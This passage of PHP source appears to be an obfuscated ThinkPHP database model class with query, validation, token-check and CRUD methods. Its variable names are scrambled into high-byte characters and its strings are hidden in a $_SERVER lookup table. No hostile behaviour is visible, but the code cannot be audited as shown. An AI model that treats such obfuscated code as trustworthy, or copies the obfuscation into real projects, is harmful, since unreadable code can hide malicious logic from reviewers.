$_SERVER[‹è™Ü¸Ñ]; if (empty($Œ¦¾å˜™) && empty($this->options[$úÇ†‚øµ[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $“ùĞ¥…Î = $this->getPk(); if (is_numeric($Œ¦¾å˜™) || is_string($Œ¦¾å˜™)) { if (strpos($Œ¦¾å˜™, $úÇ†‚øµ[50])) { $•ÅêÌü²[$“ùĞ¥…Î] = array($úÇ†‚øµ[353], $Œ¦¾å˜™); } else { $•ÅêÌü²[$“ùĞ¥…Î] = $Œ¦¾å˜™; } $this->options[$úÇ†‚øµ[352]] = $•ÅêÌü²; } $Œ¦¾å˜™ = $this->_parseOptions(); if (is_array($Œ¦¾å˜™[$úÇ†‚øµ[352]]) && isset($Œ¦¾å˜™[$úÇ†‚øµ[352]][$“ùĞ¥…Î])) { $…äËÒ» = $Œ¦¾å˜™[$úÇ†‚øµ[352]][$“ùĞ¥…Î]; } $¥è¥”ˆ = $this->db->delete($Œ¦¾å˜™); if (!1 !== $¥è¥”ˆ) { $È§Ùúµ = array(); if (isset($…äËÒ»)) { $È§Ùúµ[$“ùĞ¥…Î] = $…äËÒ»; } $this->_after_delete($È§Ùúµ, $Œ¦¾å˜™); } return $¥è¥”ˆ; } protected function _after_delete($‘Ä‰©…Ø, $ÇŞÄŸ¨¡) { } public function select($€æÏ÷š€ = array()) { $Š©ò³§° =& $_SERVER[‹è™Ü¸Ñ]; if (is_string($€æÏ÷š€) || is_numeric($€æÏ÷š€)) { $Çå€ºÓ = $this->getPk(); if (strpos($€æÏ÷š€, $Š©ò³§°[50])) { $»ÁÑ»™[$Çå€ºÓ] = array($Š©ò³§°[353], $€æÏ÷š€); } else { $»ÁÑ»™[$Çå€ºÓ] = $€æÏ÷š€; } $this->options[$Š©ò³§°[352]] = $»ÁÑ»™; } elseif (!1 === $€æÏ÷š€) { $€æÏ÷š€ = $this->_parseOptions(); return $Š©ò³§°[354] . $this->db->buildSelectSql($€æÏ÷š€) . $Š©ò³§°[355]; } $€æÏ÷š€ = $this->_parseOptions(); $³’§óû = $this->db->select($€æÏ÷š€); if (!1 === $³’§óû) { return !1; } if (empty($³’§óû)) { return null; } $this->_afterSelect($³’§óû, $€æÏ÷š€); return $³’§óû; } protected function _afterSelect(&$¾¥ÉÛ, $‰Ãâ½Ó×) { } public function buildSql($‡•´š¤” = array()) { $ì›ß£À¨ =& $_SERVER[‹è™Ü¸Ñ]; $‡•´š¤” = $this->_parseOptions($‡•´š¤”); return $ì›ß£À¨[354] . $this->db->buildSelectSql($‡•´š¤”) . $ì›ß£À¨[355]; } public function optionsValue($”˜Ÿ¹Üå = null) { if (is_null($”˜Ÿ¹Üå)) { return $this->options; } elseif (is_array($”˜Ÿ¹Üå)) { $this->options = array_merge($this->options, $”˜Ÿ¹Üå); } } protected function _parseOptions($­“è¨âò = array()) { $Á¿ş¿Íö =& $_SERVER[‹è™Ü¸Ñ]; if (is_array($­“è¨âò)) { $­“è¨âò = array_merge($this->options, $­“è¨âò); } $this->options = array(); if (!isset($­“è¨âò[$Á¿ş¿Íö[356]])) { $­“è¨âò[$Á¿ş¿Íö[356]] = $this->getTableName(); $ô±İ”¸Ç = $this->fields; } else { $ô±İ”¸Ç = $this->getDbFields(); } if (!empty($­“è¨âò[$Á¿ş¿Íö[357]])) { $­“è¨âò[$Á¿ş¿Íö[356]] .= $Á¿ş¿Íö[53] . $­“è¨âò[$Á¿ş¿Íö[357]]; } $­“è¨âò[$Á¿ş¿Íö[358]] = $this->name; if (isset($­“è¨âò[$Á¿ş¿Íö[352]]) && is_array($­“è¨âò[$Á¿ş¿Íö[352]]) && !empty($ô±İ”¸Ç) && !isset($­“è¨âò[$Á¿ş¿Íö[359]]) && !isset($­“è¨âò[$Á¿ş¿Íö[356]])) { foreach ($­“è¨âò[$Á¿ş¿Íö[352]] as $ĞÆ€½³ => $ÈªÌú³ƒ) { $ĞÆ€½³ = trim($ĞÆ€½³); if (in_array($ĞÆ€½³, $ô±İ”¸Ç, !0)) { if (is_scalar($ÈªÌú³ƒ)) { $this->_parseType($­“è¨âò[$Á¿ş¿Íö[352]], $ĞÆ€½³); } } elseif (!is_numeric($ĞÆ€½³) && $Á¿ş¿Íö[11] != substr($ĞÆ€½³, 0, 1) && !1 === strpos($ĞÆ€½³, $Á¿ş¿Íö[10]) && !1 === strpos($ĞÆ€½³, $Á¿ş¿Íö[337]) && !1 === strpos($ĞÆ€½³, $Á¿ş¿Íö[214]) && !1 === strpos($ĞÆ€½³, $Á¿ş¿Íö[360])) { unset($­“è¨âò[$Á¿ş¿Íö[352]][$ĞÆ€½³]); } } } $this->_options_filter($­“è¨âò); return $­“è¨âò; } protected function _options_filter(&$Ë‹Ùşõ„) { } protected function _parseType(&$™§ó—Üä, $æğı²¨ø) { $ÄÏ¶Â½Ô =& $_SERVER[‹è™Ü¸Ñ]; if (empty($this->options[$ÄÏ¶Â½Ô[361]][$ÄÏ¶Â½Ô[4] . $æğı²¨ø])) { $«„ö¨ôğ = strtolower($this->fields[$ÄÏ¶Â½Ô[329]][$æğı²¨ø]); if (!1 !== strpos($«„ö¨ôğ, $ÄÏ¶Â½Ô[362])) { } elseif (!1 === strpos($«„ö¨ôğ, $ÄÏ¶Â½Ô[363]) && !1 !== strpos($«„ö¨ôğ, $ÄÏ¶Â½Ô[364])) { $™§ó—Üä[$æğı²¨ø] = intval($™§ó—Üä[$æğı²¨ø]); } elseif (!1 !== strpos($«„ö¨ôğ, $ÄÏ¶Â½Ô[365]) || !1 !== strpos($«„ö¨ôğ, $ÄÏ¶Â½Ô[366])) { $™§ó—Üä[$æğı²¨ø] = floatval($™§ó—Üä[$æğı²¨ø]); } elseif (!1 !== strpos($«„ö¨ôğ, $ÄÏ¶Â½Ô[367])) { $™§ó—Üä[$æğı²¨ø] = (bool) $™§ó—Üä[$æğı²¨ø]; } } } public function find($óšÈÕÉË = array()) { $½ËÉ›ô =& $_SERVER[‹è™Ü¸Ñ]; if (is_numeric($óšÈÕÉË) || is_string($óšÈÕÉË)) { $›¿ûÙÏƒ[$this->getPk()] = intval($óšÈÕÉË); $this->options[$½ËÉ›ô[352]] = $›¿ûÙÏƒ; } $this->options[$½ËÉ›ô[368]] = 1; $óšÈÕÉË = $this->_parseOptions(); $‚‹ù‚†³ = $this->db->select($óšÈÕÉË); if (!1 === $‚‹ù‚†³) { return !1; } if (empty($‚‹ù‚†³)) { return null; } $this->data = $‚‹ù‚†³[0]; $this->_afterFind($this->data, $óšÈÕÉË); if (!empty($this->options[$½ËÉ›ô[369]])) { return $this->returnResult($this->data, $this->options[$½ËÉ›ô[369]]); } return $this->data; } protected function _afterFind(&$ôç€ÚÕÓ, $Âì·½¡×) { } protected function returnResult($Îı¨òß, $´¸ÊƒÇ = '') { $²¤ ’°¡ =& $_SERVER[‹è™Ü¸Ñ]; if ($´¸ÊƒÇ) { if (is_callable($´¸ÊƒÇ)) { return call_user_func($´¸ÊƒÇ, $Îı¨òß); } switch (strtolower($´¸ÊƒÇ)) { case $²¤ ’°¡[370]: return json_encode($Îı¨òß); case $²¤ ’°¡[371]: return xml_encode($Îı¨òß); } } return $Îı¨òß; } public function parseFieldsMap($²¯äìÕ, $®åèûÑã = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Š–”³œ => $›™èÙ¥¬) { if ($®åèûÑã == 1) { if (isset($²¯äìÕ[$›™èÙ¥¬])) { $²¯äìÕ[$Š–”³œ] = $²¯äìÕ[$›™èÙ¥¬]; unset($²¯äìÕ[$›™èÙ¥¬]); } } else { if (isset($²¯äìÕ[$Š–”³œ])) { $²¯äìÕ[$›™èÙ¥¬] = $²¯äìÕ[$Š–”³œ]; unset($²¯äìÕ[$Š–”³œ]); } } } } return $²¯äìÕ; } public function setField($­š Ñ¹, $±Ô”¾Óı = '') { if (is_array($­š Ñ¹)) { $®ëÜãïõ = $­š Ñ¹; } else { $®ëÜãïõ[$­š Ñ¹] = $±Ô”¾Óı; } return $this->save($®ëÜãïõ); } public function setAdd($¹ü…ëÄô, $ÔÃÖù¾÷ = 1) { $ô„ùõï‚ =& $_SERVER[‹è™Ü¸Ñ]; $ÑãâÑ÷ = $¹ü…ëÄô . $ô„ùõï‚[372] . $ÔÃÖù¾÷; if ($ÔÃÖù¾÷ < 0) { $ÑãâÑ÷ = $¹ü…ëÄô . $ÔÃÖù¾÷; } return $this->setField($¹ü…ëÄô, array($ô„ùõï‚[373], $ÑãâÑ÷)); } public function getField($í›€š…à, $­ˆÂ·îó = null) { $úŞŒ¾¤Š =& $_SERVER[‹è™Ü¸Ñ]; $á…¨¶í¦[$úŞŒ¾¤Š[350]] = $í›€š…à; $á…¨¶í¦ = $this->_parseOptions($á…¨¶í¦); $í›€š…à = trim($í›€š…à); if (strpos($í›€š…à, $úŞŒ¾¤Š[50])) { if (!isset($á…¨¶í¦[$úŞŒ¾¤Š[368]])) { $á…¨¶í¦[$úŞŒ¾¤Š[368]] = is_numeric($­ˆÂ·îó) ? $­ˆÂ·îó : $úŞŒ¾¤Š[12]; } $âÚÓ¨ì = $this->db->select($á…¨¶í¦); if (!empty($âÚÓ¨ì)) { $’ˆ¼Á«Ù = explode($úŞŒ¾¤Š[50], $í›€š…à); $í›€š…à = array_keys($âÚÓ¨ì[0]); $ÖÏ¡ÉÊÌ = array_shift($í›€š…à); $ıº¶‡»Ğ = array_shift($í›€š…à); $¨ğã€Å™ = array(); $¦ñÕûô = count($’ˆ¼Á«Ù); foreach ($âÚÓ¨ì as $Óä²¼×ø) { $Ó¢â·ãø = $Óä²¼×ø[$ÖÏ¡ÉÊÌ]; if (2 == $¦ñÕûô) { $¨ğã€Å™[$Ó¢â·ãø] = $Óä²¼×ø[$ıº¶‡»Ğ]; } else { $¨ğã€Å™[$Ó¢â·ãø] = is_string($­ˆÂ·îó) ? implode($­ˆÂ·îó, $Óä²¼×ø) : $Óä²¼×ø; } } return $¨ğã€Å™; } } else { if (!0 !== $­ˆÂ·îó) { $á…¨¶í¦[$úŞŒ¾¤Š[368]] = is_numeric($­ˆÂ·îó) ? $­ˆÂ·îó : 1; } if ($­ˆÂ·îó === $úŞŒ¾¤Š[332]) { unset($á…¨¶í¦[$úŞŒ¾¤Š[368]]); } $Óä²¼×ø = $this->db->select($á…¨¶í¦); if (!empty($Óä²¼×ø)) { if ($­ˆÂ·îó === $úŞŒ¾¤Š[332]) { return reset($Óä²¼×ø[0]); } if (!0 !== $­ˆÂ·îó && 1 == $á…¨¶í¦[$úŞŒ¾¤Š[368]]) { return reset($Óä²¼×ø[0]); } foreach ($Óä²¼×ø as $Û’êŞ§) { $¡²¢ğñª[] = $Û’êŞ§[$í›€š…à]; } return $¡²¢ğñª; } } return null; } public function create($Áæï¯’ = '', $úÄŠÖÉà = '') { $›‘ß¹ø€ =& $_SERVER[‹è™Ü¸Ñ]; if (empty($Áæï¯’)) { $Áæï¯’ = $_POST; } elseif (is_object($Áæï¯’)) { $Áæï¯’ = get_object_vars($Áæï¯’); } if (empty($Áæï¯’) || !is_array($Áæï¯’)) { $this->error = think_lang($›‘ß¹ø€[348]); return !1; } $Áæï¯’ = $this->parseFieldsMap($Áæï¯’, 0); $úÄŠÖÉà = $úÄŠÖÉà ? $úÄŠÖÉà : (!empty($Áæï¯’[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$›‘ß¹ø€[350]])) { $²Ì¬½ıê = $this->options[$›‘ß¹ø€[350]]; unset($this->options[$›‘ß¹ø€[350]]); } elseif ($úÄŠÖÉà == THINK_MODEL_INSERT && isset($this->insertFields)) { $²Ì¬½ıê = $this->insertFields; } elseif ($úÄŠÖÉà == THINK_MODEL_UPDATE && isset($this->updateFields)) { $²Ì¬½ıê = $this->updateFields; } if (isset($²Ì¬½ıê)) { if (is_string($²Ì¬½ıê)) { $²Ì¬½ıê = explode($›‘ß¹ø€[50], $²Ì¬½ıê); } if (think_config($›‘ß¹ø€[374])) { $²Ì¬½ıê[] = think_config($›‘ß¹ø€[375]); } foreach ($Áæï¯’ as $Ç–†µô¦ => $õ÷Ö­ÒÌ) { if (!in_array($Ç–†µô¦, $²Ì¬½ıê)) { unset($Áæï¯’[$Ç–†µô¦]); } } } if (!$this->autoValidation($Áæï¯’, $úÄŠÖÉà)) { return !1; } if (!$this->autoCheckToken($Áæï¯’)) { $this->error = think_lang($›‘ß¹ø€[376]); return !1; } if ($this->autoCheckFields) { $²Ì¬½ıê = $this->getDbFields(); foreach ($Áæï¯’ as $Ç–†µô¦ => $õ÷Ö­ÒÌ) { if (!in_array($Ç–†µô¦, $²Ì¬½ıê)) { unset($Áæï¯’[$Ç–†µô¦]); } elseif (MAGIC_QUOTES_GPC && is_string($õ÷Ö­ÒÌ)) { $Áæï¯’[$Ç–†µô¦] = stripslashes($õ÷Ö­ÒÌ); } } } $this->autoOperation($Áæï¯’, $úÄŠÖÉà); $this->data = $Áæï¯’; return $Áæï¯’; } public function autoCheckToken($£Ğ°›€ô) { $•Ğ“¸Öí =& $_SERVER[‹è™Ü¸Ñ]; if (isset($this->options[$•Ğ“¸Öí[377]]) && !$this->options[$•Ğ“¸Öí[377]]) { return !0; } if (think_config($•Ğ“¸Öí[374])) { $ØŠ—Ä™ã = think_config($•Ğ“¸Öí[375]); if (!isset($£Ğ°›€ô[$ØŠ—Ä™ã]) || Session::get($ØŠ—Ä™ã)) { return !1; } list($ÃÈçŸ¤—, $ŸúÇïéé) = explode($•Ğ“¸Öí[11], $£Ğ°›€ô[$ØŠ—Ä™ã]); if ($ŸúÇïéé && Session::get($ØŠ—Ä™ã . $•Ğ“¸Öí[10] . $ÃÈçŸ¤—) === $ŸúÇïéé) { Session::remove($ØŠ—Ä™ã . $•Ğ“¸Öí[10] . $ÃÈçŸ¤—); return !0; } if (think_config($•Ğ“¸Öí[378])) { Session::remove($ØŠ—Ä™ã . $•Ğ“¸Öí[10] . $ÃÈçŸ¤—); } return !1; } return !0; } public function regex($´æ™´ë÷, $°ŸÉÄáø) { $•ÚÓ‰¾õ =& $_SERVER[‹è™Ü¸Ñ]; $ë‘®ùëŞ = array($•ÚÓ‰¾õ[379] => $•ÚÓ‰¾õ[380], $•ÚÓ‰¾õ[381] => $•ÚÓ‰¾õ[382], $•ÚÓ‰¾õ[383] => $•ÚÓ‰¾õ[384], $•ÚÓ‰¾õ[385] => $•ÚÓ‰¾õ[386], $•ÚÓ‰¾õ[387] => $•ÚÓ‰¾õ[388], $•ÚÓ‰¾õ[389] => $•ÚÓ‰¾õ[390], $•ÚÓ‰¾õ[391] => $•ÚÓ‰¾õ[392], $•ÚÓ‰¾õ[366] => $•ÚÓ‰¾õ[393], $•ÚÓ‰¾õ[394] => $•ÚÓ‰¾õ[395]); if (isset($ë‘®ùëŞ[strtolower($°ŸÉÄáø)])) { $°ŸÉÄáø = $ë‘®ùëŞ[strtolower($°ŸÉÄáø)]; } return preg_match($°ŸÉÄáø, $´æ™´ë÷) === 1; } private function autoOperation(&$ö€¶²é¶, $Æ³ùã™) { $„Š¼•“Ù =& $_SERVER[‹è™Ü¸Ñ]; if (!empty($this->options[$„Š¼•“Ù[396]])) { $—‰«ÊõÏ = $this->options[$„Š¼•“Ù[396]]; unset($this->options[$„Š¼•“Ù[396]]); } elseif (!empty($this->_auto)) { $—‰«ÊõÏ = $this->_auto; } if (isset($—‰«ÊõÏ)) { foreach ($—‰«ÊõÏ as $÷ŞÄ“Ñé) { if (empty($÷ŞÄ“Ñé[2])) { $÷ŞÄ“Ñé[2] = THINK_MODEL_INSERT; } if ($Æ³ùã™ == $÷ŞÄ“Ñé[2] || $÷ŞÄ“Ñé[2] == THINK_MODEL_BOTH) { switch (trim($÷ŞÄ“Ñé[3])) { case $„Š¼•“Ù[397]: case $„Š¼•“Ù[398]: $ÖÒÜÕ¼½ = isset($÷ŞÄ“Ñé[4]) ? (array) $÷ŞÄ“Ñé[4] : array(); if (isset($ö€¶²é¶[$÷ŞÄ“Ñé[0]])) { array_unshift($ÖÒÜÕ¼½, $ö€¶²é¶[$÷ŞÄ“Ñé[0]]); } if ($„Š¼•“Ù[397] == $÷ŞÄ“Ñé[3]) { $ö€¶²é¶[$÷ŞÄ“Ñé[0]] = call_user_func_array($÷ŞÄ“Ñé[1], $ÖÒÜÕ¼½); } else { $ö€¶²é¶[$÷ŞÄ“Ñé[0]] = call_user_func_array(array(&$this, $÷ŞÄ“Ñé[1]), $ÖÒÜÕ¼½); } break; case $„Š¼•“Ù[350]: $ö€¶²é¶[$÷ŞÄ“Ñé[0]] = $ö€¶²é¶[$÷ŞÄ“Ñé[1]]; break; case $„Š¼•“Ù[399]: if ($„Š¼•“Ù[12] === $ö€¶²é¶[$÷ŞÄ“Ñé[0]]) { unset($ö€¶²é¶[$÷ŞÄ“Ñé[0]]); } break; case $„Š¼•“Ù[400]: default: $ö€¶²é¶[$÷ŞÄ“Ñé[0]] = $÷ŞÄ“Ñé[1]; } if (!1 === $ö€¶²é¶[$÷ŞÄ“Ñé[0]]) { unset($ö€¶²é¶[$÷ŞÄ“Ñé[0]]); } } } } return $ö€¶²é¶; } protected function autoValidation($ŸÖà¥½ü, $øá‚Û) { $í¦ÚüÍ¡ =& $_SERVER[‹è™Ü¸Ñ]; if (!empty($this->options[$í¦ÚüÍ¡[401]])) { $””Ò¨ı = $this->options[$í¦ÚüÍ¡[401]]; unset($this->options[$í¦ÚüÍ¡[401]]); } elseif (!empty($this->_validate)) { $””Ò¨ı = $this->_validate; } if (isset($””Ò¨ı)) { if ($this->patchValidate) { $this->error = array(); } foreach ($””Ò¨ı as $„Ã©¼‚¥ => $“ø®æí¾) { if (empty($“ø®æí¾[5]) || $“ø®æí¾[5] == THINK_MODEL_BOTH || $“ø®æí¾[5] == $øá‚Û) { if (0 == strpos($“ø®æí¾[2], $í¦ÚüÍ¡[402]) && strpos($“ø®æí¾[2], $í¦ÚüÍ¡[403])) { $“ø®æí¾[2] = think_lang(substr($“ø®æí¾[2], 2, -1)); } $“ø®æí¾[3] = isset($“ø®æí¾[3]) ? $“ø®æí¾[3] : THINK_EXISTS_VALIDATE; $“ø®æí¾[4] = isset($“ø®æí¾[4]) ? $“ø®æí¾[4] : $í¦ÚüÍ¡[404]; switch ($“ø®æí¾[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ŸÖà¥½ü, $“ø®æí¾)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($í¦ÚüÍ¡[12] != trim($ŸÖà¥½ü[$“ø®æí¾[0]])) { if (!1 === $this->_validationField($ŸÖà¥½ü, $“ø®æí¾)) { return !1; } } break; default: if (isset($ŸÖà¥½ü[$“ø®æí¾[0]])) { if (!1 === $this->_validationField($ŸÖà¥½ü, $“ø®æí¾)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ÑÎ½ˆÅÖ, $ß»‡êê²) { if (!1 === $this->_validationFieldItem($ÑÎ½ˆÅÖ, $ß»‡êê²)) { if ($this->patchValidate) { $this->error[$ß»‡êê²[0]] = $ß»‡êê²[2]; } else { $this->error = $ß»‡êê²[2]; return !1; } } return; } protected function _validationFieldItem($Â°ø®³›, $ÄÂƒ×„¸) { $Õä§ì›½ =& $_SERVER[‹è™Ü¸Ñ]; switch (strtolower(trim($ÄÂƒ×„¸[4]))) { case $Õä§ì›½[397]: case $Õä§ì›½[398]: $Ñµœ‹öÇ = isset($ÄÂƒ×„¸[6]) ? (array) $ÄÂƒ×„¸[6] : array(); if (is_string($ÄÂƒ×„¸[0]) && strpos($ÄÂƒ×„¸[0], $Õä§ì›½[50])) { $ÄÂƒ×„¸[0] = explode($Õä§ì›½[50], $ÄÂƒ×„¸[0]); } if (is_array($ÄÂƒ×„¸[0])) { foreach ($ÄÂƒ×„¸[0] as $”šÏş¿µ) { $¼É‡ÜÉË[$”šÏş¿µ] = $Â°ø®³›[$”šÏş¿µ]; } array_unshift($Ñµœ‹öÇ, $¼É‡ÜÉË); } else { array_unshift($Ñµœ‹öÇ, $Â°ø®³›[$ÄÂƒ×„¸[0]]); } if ($Õä§ì›½[397] == $ÄÂƒ×„¸[4]) { return call_user_func_array($ÄÂƒ×„¸[1], $Ñµœ‹öÇ); } else { return call_user_func_array(array(&$this, $ÄÂƒ×„¸[1]), $Ñµœ‹öÇ); } case $Õä§ì›½[405]: return $Â°ø®³›[$ÄÂƒ×„¸[0]] == $Â°ø®³›[$ÄÂƒ×„¸[1]]; case $Õä§ì›½[406]: if (is_string($ÄÂƒ×„¸[0]) && strpos($ÄÂƒ×„¸[0], $Õä§ì›½[50])) { $ÄÂƒ×„¸[0] = explode($Õä§ì›½[50], $ÄÂƒ×„¸[0]); } $Àœ¿—Õì = array(); if (is_array($ÄÂƒ×„¸[0])) { foreach ($ÄÂƒ×„¸[0] as $”šÏş¿µ) { $Àœ¿—Õì[$”šÏş¿µ] = $Â°ø®³›[$”šÏş¿µ]; } } else { $Àœ¿—Õì[$ÄÂƒ×„¸[0]] = $Â°ø®³›[$ÄÂƒ×„¸[0]]; } if (!empty($Â°ø®³›[$this->getPk()])) { $Àœ¿—Õì[$this->getPk()] = array($Õä§ì›½[407], $Â°ø®³›[$this->getPk()]); } if ($this->where($Àœ¿—Õì)->find()) { return !1; } return !0; default: return $this->check($Â°ø®³›[$ÄÂƒ×„¸[0]], $ÄÂƒ×„¸[1], $ÄÂƒ×„¸[4]); } } public function check($Ìí¨¬èá, $úŠù…´, $Â¤Œ‚ö© = "\x72\x65\147\145\x78") { $‹˜ë•³ =& $_SERVER[‹è™Ü¸Ñ]; $Â¤Œ‚ö© = strtolower(trim($Â¤Œ‚ö©)); switch ($Â¤Œ‚ö©) { case $‹˜ë•³[7]: case $‹˜ë•³[408]: $…¼áÈú› = is_array($úŠù…´) ? $úŠù…´ : explode($‹˜ë•³[50], $úŠù…´); return $Â¤Œ‚ö© == $‹˜ë•³[7] ? in_array($Ìí¨¬èá, $…¼áÈú›) : !in_array($Ìí¨¬èá, $…¼áÈú›); case $‹˜ë•³[409]: case $‹˜ë•³[410]: if (is_array($úŠù…´)) { $Ñ¶­¡¤¹ = $úŠù…´[0]; $Á£óÕ‡ù = $úŠù…´[1]; } else { list($Ñ¶­¡¤¹, $Á£óÕ‡ù) = explode($‹˜ë•³[50], $úŠù…´); } return $Â¤Œ‚ö© == $‹˜ë•³[409] ? $Ìí¨¬èá >= $Ñ¶­¡¤¹ && $Ìí¨¬èá <= $Á£óÕ‡ù : $Ìí¨¬èá < $Ñ¶­¡¤¹ || $Ìí¨¬èá > $Á£óÕ‡ù; case $‹˜ë•³[411]: case $‹˜ë•³[412]: return $Â¤Œ‚ö© == $‹˜ë•³[411] ? $Ìí¨¬èá == $úŠù…´ : $Ìí¨¬èá != $úŠù…´; case $‹˜ë•³[413]: $”Ö¨ìÇ = mb_strlen($Ìí¨¬èá, $‹˜ë•³[414]); if (strpos($úŠù…´, $‹˜ë•³[50])) { list($Ñ¶­¡¤¹, $Á£óÕ‡ù) = explode($‹˜ë•³[50], $úŠù…´); return $”Ö¨ìÇ >= $Ñ¶­¡¤¹ && $”Ö¨ìÇ <= $Á£óÕ‡ù; } else { return $”Ö¨ìÇ == $úŠù…´; } case $‹˜ë•³[415]: list($è¤Ì…ò¨, $ã‡½ô“») = explode($‹˜ë•³[50], $úŠù…´); if (!is_numeric($è¤Ì…ò¨)) { $è¤Ì…ò¨ = strtotime($è¤Ì…ò¨); } if (!is_numeric($ã‡½ô“»)) { $ã‡½ô“» = strtotime($ã‡½ô“»); } return NOW_TIME >= $è¤Ì…ò¨ && NOW_TIME <= $ã‡½ô“»; case $‹˜ë•³[416]: return in_array(get_client_ip(), explode($‹˜ë•³[50], $úŠù…´)); case $‹˜ë•³[417]: return !in_array(get_client_ip(), explode($‹˜ë•³[50], $úŠù…´)); case $‹˜ë•³[404]: default: return $this->regex($Ìí¨¬èá, $úŠù…´); } } public function query($æ«õßÛ°, $œŒîÑÏä = false) { $¥‡ô®¦Ø =& $_SERVER[‹è™Ü¸Ñ]; if (!is_bool($œŒîÑÏä) && !is_array($œŒîÑÏä)) { $œŒîÑÏä = func_get_args(); array_shift($œŒîÑÏä); } $æ«õßÛ° = str_replace(array($¥‡ô®¦Ø[262], $¥‡ô®¦Ø[418]), $¥‡ô®¦Ø[53], $æ«õßÛ°); $æ«õßÛ° = $this->parseSql($æ«õßÛ°, $œŒîÑÏä); return $this->db->query($æ«õßÛ°); } public function execute($Ğ‹¬¿Í¡, $Óï«Ó”é = false) { if (!is_bool($Óï«Ó”é) && !is_array($Óï«Ó”é)) { $Óï«Ó”é = func_get_args(); array_shift($Óï«Ó”é); } $Ğ‹¬¿Í¡ = $this->parseSql($Ğ‹¬¿Í¡, $Óï«Ó”é); return $this->db->execute($Ğ‹¬¿Í¡); } protected function parseSql($Ô—ŞÒóğ, $¸ÑÅ…´µ) { $ùÕÊì›ö =& $_SERVER[‹è™Ü¸Ñ]; if (!0 === $¸ÑÅ…´µ) { $Œ‘àõ·Û = $this->_parseOptions(); $Ô—ŞÒóğ = $this->db->parseSql($Ô—ŞÒóğ, $Œ‘àõ·Û); } elseif (is_array($¸ÑÅ…´µ)) { $¸ÑÅ…´µ = array_map(array($this->db, $ùÕÊì›ö[419]), $¸ÑÅ…´µ); $Ô—ŞÒóğ = vsprintf($Ô—ŞÒóğ, $¸ÑÅ…´µ); } else { $Ô—ŞÒóğ = strtr($Ô—ŞÒóğ, array($ùÕÊì›ö[420] => $this->getTableName(), $ùÕÊì›ö[421] => think_config($ùÕÊì›ö[321]))); } $this->db->setModel($this->name); return $Ô—ŞÒóğ; } public function db($¶‰ŒªÑÊ = '', $Ùìï·¼ı = '', $ÕÊß’š¾ = array()) { $í³µà®Ä =& $_SERVER[‹è™Ü¸Ñ]; if ($í³µà®Ä[12] === $¶‰ŒªÑÊ && $this->db) { return $this->db; } static $Á¡ç¸Ãœ = array(); static $Âª§Áœ¤ = array(); if (!isset($Âª§Áœ¤[$¶‰ŒªÑÊ]) || isset($Âª§Áœ¤[$¶‰ŒªÑÊ]) && $Ùìï·¼ı && $Á¡ç¸Ãœ[$¶‰ŒªÑÊ] != $Ùìï·¼ı) { if (!empty($Ùìï·¼ı) && is_string($Ùìï·¼ı) && !1 === strpos($Ùìï·¼ı, $í³µà®Ä[8])) { $Ùìï·¼ı = think_config($Ùìï·¼ı); } $¶‰ŒªÑÊ = think_guid($Ùìï·¼ı); $Âª§Áœ¤[$¶‰ŒªÑÊ] = Db::getInstance($Ùìï·¼ı); } elseif (NULL === $Ùìï·¼ı) { $Âª§Áœ¤[$¶‰ŒªÑÊ]->close(); unset($Âª§Áœ¤[$¶‰ŒªÑÊ]); return; } if (!empty($ÕÊß’š¾)) { if (is_string($ÕÊß’š¾)) { parse_str($ÕÊß’š¾, $ÕÊß’š¾); } foreach ($ÕÊß’š¾ as $ôíÍ™ıÙ => $ğâ£¨¸µ) { $this->setProperty($ôíÍ™ıÙ, $ğâ£¨¸µ); } } $Á¡ç¸Ãœ[$¶‰ŒªÑÊ] = $Ùìï·¼ı; $this->db = $Âª§Áœ¤[$¶‰ŒªÑÊ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $–êÄ—î = get_class($this); if ($–êÄ—î == $_SERVER[‹è™Ü¸Ñ][422]) { return $this->name; } $this->name = substr($–êÄ—î, 0, -5); } return $this->name; } public function getTableName() { $¢ÂîÖà =& $_SERVER[‹è™Ü¸Ñ]; if (empty($this->trueTableName)) { $ŠáÜ­„Å = !empty($this->tablePrefix) ? $this->tablePrefix : $¢ÂîÖà[12]; if (!empty($this->tableName)) { $ŠáÜ­„Å .= $this->tableName; } else { $ŠáÜ­„Å .= think_parse_name($this->name); } $this->trueTableName = strtolower($ŠáÜ­„Å); } return (!empty($this->dbName) ? $this->dbName . $¢ÂîÖà[10] : $¢ÂîÖà[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¢»İ¬²Ş =& $_SERVER[‹è™Ü¸Ñ]; return isset($this->fields[$¢»İ¬²Ş[328]]) ? $this->fields[$¢»İ¬²Ş[328]] : $this->pk; } public function getDbFields() { $£Å‰ªüŞ =& $_SERVER[‹è™Ü¸Ñ]; if (isset($this->options[$£Å‰ªüŞ[356]])) { $Ü÷¶©ÍÑ = $this->db->getFields($this->options[$£Å‰ªüŞ[356]]); return $Ü÷¶©ÍÑ ? array_keys($Ü÷¶©ÍÑ) : !1; } if ($this->fields) { $Ü÷¶©ÍÑ = $this->fields; unset($Ü÷¶©ÍÑ[$£Å‰ªüŞ[327]], $Ü÷¶©ÍÑ[$£Å‰ªüŞ[328]], $Ü÷¶©ÍÑ[$£Å‰ªüŞ[329]], $Ü÷¶©ÍÑ[$£Å‰ªüŞ[326]]); return $Ü÷¶©ÍÑ; } return !1; } public function data($¯¢Â±¶  = '') { $ã‡åŒçÆ =& $_SERVER[‹è™Ü¸Ñ]; if ($ã‡åŒçÆ[12] === $¯¢Â±¶  && !empty($this->data)) { return $this->data; } if (is_object($¯¢Â±¶ )) { $¯¢Â±¶  = get_object_vars($¯¢Â±¶ ); } elseif (is_string($¯¢Â±¶ )) { parse_str($¯¢Â±¶ , $¯¢Â±¶ ); } elseif (!is_array($¯¢Â±¶ )) { 